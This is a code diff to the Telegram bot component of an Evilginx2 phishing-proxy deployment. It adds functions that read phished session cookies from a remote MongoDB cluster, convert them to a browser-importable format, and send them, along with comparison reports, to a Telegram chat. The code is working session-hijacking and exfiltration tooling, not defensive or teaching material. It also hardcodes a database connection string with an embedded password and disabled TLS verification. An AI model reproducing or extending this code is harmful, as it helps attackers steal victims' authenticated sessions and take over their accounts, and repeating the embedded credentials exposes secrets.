@@ -9,6 +9,7 @@ import (
 	"time"
 	"bytes"
 	"mime/multipart"
+	"strconv"
 
 	"github.com/kgretzky/evilginx2/log"
 
@@ -18,6 +19,7 @@ import (
 	"go.mongodb.org/mongo-driver/mongo"
 	"go.mongodb.org/mongo-driver/mongo/options"
 	"go.mongodb.org/mongo-driver/bson/primitive"
+	"github.com/kgretzky/evilginx2/database"
 )
 
 type TelegramBot struct {
@@ -697,4 +699,223 @@ func (t *TelegramBot) SendCookiesFile(sessionID, fileContent string) error {
 	}
 	
 	return nil
+}
+
+// ExportCookiesInEvilginxFormat exports cookies in the exact same format as Evilginx's terminal command
+func (t *TelegramBot) ExportCookiesInEvilginxFormat(sessionID string) (string, error) {
+	// Connect to MongoDB
+	mongo_uri := "mongodb+srv://jemex2023:l0mwPDO40LYAJ0xs@cluster0.bldhxin.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsInsecure=true&ssl=true"
+	db_name := "evilginx"
+
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	client, err := mongo.Connect(ctx, options.Client().ApplyURI(mongo_uri))
+	if err != nil {
+		return "", fmt.Errorf("failed to connect to MongoDB: %v", err)
+	}
+	defer client.Disconnect(ctx)
+
+	// Get session from MongoDB
+	collection := client.Database(db_name).Collection("sessions")
+	var session bson.M
+	err = collection.FindOne(ctx, bson.M{"session_id": sessionID}).Decode(&session)
+	if err != nil {
+		return "", fmt.Errorf("session not found: %s", sessionID)
+	}
+
+	// Convert to Evilginx format
+	type Cookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly"`
+		HostOnly       bool   `json:"hostOnly"`
+		Secure         bool   `json:"secure"`
+		Session        bool   `json:"session"`
+	}
+
+	var cookies []*Cookie
+	
+	// Get cookie tokens from session
+	if cookieTokens, ok := session["cookie_tokens"].(map[string]interface{}); ok {
+		for domain, tokens := range cookieTokens {
+			if tokenArray, ok := tokens.([]interface{}); ok {
+				for _, token := range tokenArray {
+					if tokenMap, ok := token.(map[string]interface{}); ok {
+						name := getStringValueFromMap(tokenMap, "name")
+						value := getStringValueFromMap(tokenMap, "value")
+						path := getStringValueFromMap(tokenMap, "path")
+						httpOnly := getBoolValueFromMap(tokenMap, "httpOnly")
+						hostOnly := getBoolValueFromMap(tokenMap, "hostOnly")
+						secure := getBoolValueFromMap(tokenMap, "secure")
+						
+						// Get expiration date
+						expirationDate := int64(0)
+						if ed, ok := tokenMap["expirationDate"]; ok {
+							switch v := ed.(type) {
+							case int64:
+								expirationDate = v
+							case int32:
+								expirationDate = int64(v)
+							case float64:
+								expirationDate = int64(v)
+							case float32:
+								expirationDate = int64(v)
+							case string:
+								if parsed, err := strconv.ParseInt(v, 10, 64); err == nil {
+									expirationDate = parsed
+								}
+							}
+						}
+
+						c := &Cookie{
+							Path:           path,
+							Domain:         domain,
+							ExpirationDate: expirationDate,
+							Value:          value,
+							Name:           name,
+							HttpOnly:       httpOnly,
+							HostOnly:       hostOnly,
+							Secure:         secure,
+							Session:        false,
+						}
+						cookies = append(cookies, c)
+					}
+				}
+			}
+		}
+	}
+
+	json, err := json.Marshal(cookies)
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal cookies: %v", err)
+	}
+	
+	return string(json), nil
+}
+
+// SendCookieComparison sends a comparison between MongoDB cookies and Evilginx format to Telegram
+func (t *TelegramBot) SendCookieComparison(sessionID string) error {
+	if !t.Enabled {
+		return fmt.Errorf("telegram bot is disabled")
+	}
+
+	// Get cookies in Evilginx format from MongoDB
+	evilginxFormat, err := t.ExportCookiesInEvilginxFormat(sessionID)
+	if err != nil {
+		return fmt.Errorf("failed to export cookies: %v", err)
+	}
+
+	// Create comparison message
+	message := fmt.Sprintf(
+		"🔍 <b>Cookie Format Comparison</b>\n\n"+
+		"🆔 <b>Session ID:</b> %s\n\n"+
+		"📋 <b>Cookies in Evilginx Format:</b>\n"+
+		"<code>%s</code>\n\n"+
+		"💡 <b>Note:</b> This format should match exactly with Evilginx's 'sessions %s' command output.",
+		sessionID, evilginxFormat, sessionID,
+	)
+
+	// Send the comparison message
+	return t.SendMessage(message)
+}
+
+// SendCookieValidationReport sends a detailed cookie validation report to Telegram
+func (t *TelegramBot) SendCookieValidationReport(sessionID string, evilginxCookiesJSON string) error {
+	if !t.Enabled {
+		return fmt.Errorf("telegram bot is disabled")
+	}
+
+	// Connect to MongoDB to get validation result
+	mongo_uri := "mongodb+srv://jemex2023:l0mwPDO40LYAJ0xs@cluster0.bldhxin.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsInsecure=true&ssl=true"
+	db_name := "evilginx"
+
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	client, err := mongo.Connect(ctx, options.Client().ApplyURI(mongo_uri))
+	if err != nil {
+		return fmt.Errorf("failed to connect to MongoDB: %v", err)
+	}
+	defer client.Disconnect(ctx)
+
+	// Create a temporary database instance for validation
+	tempDB := database.NewMongoDatabaseFromExisting(client, db_name)
+
+	// Get validation result
+	result, err := tempDB.ValidateCookiesAgainstEvilginx(sessionID, evilginxCookiesJSON)
+	if err != nil {
+		return fmt.Errorf("validation failed: %v", err)
+	}
+
+	// Build the message
+	var message strings.Builder
+	message.WriteString(fmt.Sprintf("🔍 <b>Cookie Validation Report</b>\n\n"))
+	message.WriteString(fmt.Sprintf("🆔 <b>Session ID:</b> %s\n", sessionID))
+	message.WriteString(fmt.Sprintf("📊 <b>Summary:</b>\n"))
+	message.WriteString(fmt.Sprintf("   • Evilginx cookies: %d\n", result.TotalEvilginx))
+	message.WriteString(fmt.Sprintf("   • MongoDB cookies: %d\n", result.TotalMongoDB))
+	message.WriteString(fmt.Sprintf("   • Perfect match: %t\n", result.PerfectMatch))
+
+	if result.PerfectMatch {
+		message.WriteString("\n✅ <b>All cookies match perfectly!</b>\n")
+	} else {
+		// Report missing cookies
+		if len(result.MissingInMongoDB) > 0 {
+			message.WriteString(fmt.Sprintf("\n❌ <b>Missing in MongoDB (%d):</b>\n", len(result.MissingInMongoDB)))
+			for _, key := range result.MissingInMongoDB {
+				message.WriteString(fmt.Sprintf("   • %s\n", key))
+			}
+		}
+
+		if len(result.MissingInEvilginx) > 0 {
+			message.WriteString(fmt.Sprintf("\n⚠️ <b>Missing in Evilginx (%d):</b>\n", len(result.MissingInEvilginx)))
+			for _, key := range result.MissingInEvilginx {
+				message.WriteString(fmt.Sprintf("   • %s\n", key))
+			}
+		}
+
+		// Report mismatched cookies
+		if len(result.MismatchedCookies) > 0 {
+			message.WriteString(fmt.Sprintf("\n🔍 <b>Mismatched cookies (%d):</b>\n", len(result.MismatchedCookies)))
+			for key, mismatch := range result.MismatchedCookies {
+				message.WriteString(fmt.Sprintf("   • %s (%s):\n", key, mismatch.Attribute))
+				message.WriteString(fmt.Sprintf("     Evilginx: %s\n", mismatch.EvilginxValue))
+				message.WriteString(fmt.Sprintf("     MongoDB: %s\n", mismatch.MongoDBValue))
+			}
+		}
+
+		// Report matching cookies
+		if len(result.MatchingCookies) > 0 {
+			message.WriteString(fmt.Sprintf("\n✅ <b>Matching cookies (%d):</b>\n", len(result.MatchingCookies)))
+			for _, key := range result.MatchingCookies {
+				message.WriteString(fmt.Sprintf("   • %s\n", key))
+			}
+		}
+	}
+
+	// Send the message
+	return t.SendMessage(message.String())
+}
+
+// Helper functions for extracting values from map[string]interface{}
+func getStringValueFromMap(m map[string]interface{}, key string) string {
+	if v, ok := m[key]; ok {
+		if str, ok := v.(string); ok {
+			return str
+		}
+	}
+	return ""
+}
+
+func getBoolValueFromMap(m map[string]interface{}, key string) bool {
+	if v, ok := m[key]; ok {
+		if b, ok := v.(bool); ok {
+			return b
+		}
+	}
+	return false
 }
